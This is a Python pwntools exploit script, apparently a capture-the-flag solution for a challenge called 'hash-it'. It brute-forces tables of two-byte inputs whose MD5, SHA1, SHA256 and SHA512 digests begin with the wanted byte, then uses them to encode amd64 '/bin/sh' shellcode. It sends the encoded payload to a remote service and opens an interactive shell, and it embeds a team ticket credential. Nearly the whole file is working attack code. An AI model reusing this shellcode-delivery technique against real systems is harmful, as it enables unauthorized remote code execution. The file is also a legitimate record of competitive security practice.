#!/usr/bin/env python3

# pylint: skip-file

import hashlib
from pwn import *

#NAME = 'bin.patch'
NAME = 'zc7ejjq9ehhcqj1x61ekoa8pjtk7'
PORT = 31337
URL = 'hash-it-0-m7tt7b7whagjw.shellweplayaga.me'
FLAGFILE = 'flag'

GDB_COMMAND = """
starti
continue
"""

context.binary = ELF(NAME)
context.terminal = ['urxvt', '-e', 'sh', '-c']

TEAM_TICKET = (
    'ticket{WeatherdeckGangway234n22:ucS8rtF6SEnCyz2MndtK-ysYI-tEvNI4gkh8qaFb6'
    'XePDcOC}')

MD5_TABLE = {}
SHA1_TABLE = {}
SHA256_TABLE = {}
SHA512_TABLE = {}
LOOKUP_TABLES = [MD5_TABLE, SHA1_TABLE, SHA256_TABLE, SHA512_TABLE]


def build_tables():
    for i in range(2**16):
        i_bytes = i.to_bytes(2, byteorder='big')

        m_md5 = hashlib.md5()
        m_md5.update(i_bytes)
        MD5_TABLE[m_md5.digest()[0]] = i_bytes

        m_sha1 = hashlib.sha1()
        m_sha1.update(i_bytes)
        SHA1_TABLE[m_sha1.digest()[0]] = i_bytes

        m_sha256 = hashlib.sha256()
        m_sha256.update(i_bytes)
        SHA256_TABLE[m_sha256.digest()[0]] = i_bytes

        m_sha512 = hashlib.sha512()
        m_sha512.update(i_bytes)
        SHA512_TABLE[m_sha512.digest()[0]] = i_bytes


def main():

    if args['REMOTE']:
        p = remote(URL, PORT)
    else:
        write(FLAGFILE, 'THIS_IS_THE_FLAG' * 4 + '\n')
        p = process(context.binary.path)
        if args['GDB']:
            gdb.attach(p, GDB_COMMAND)

    # Send team ticket.
    if args['REMOTE']:
        p.sendline(TEAM_TICKET)

    # Construct hash tables to look up shellcode bytes.
    build_tables()

    # Assemble shellcode.
    shellcode = asm(shellcraft.amd64.linux.sh())

    # Convert assembled shellcode into encoded values by looking up in tables.
    encoded = b''
    for i, byte in enumerate(shellcode):
        lookup_table = LOOKUP_TABLES[i % 4]
        encoded += lookup_table[byte]

    # Send encoded shellcode length.
    p.send(p32(len(encoded), endianness='big'))

    # Send encoded shellcode.
    p.send(encoded)
    p.interactive()


if __name__ == '__main__':
    main()
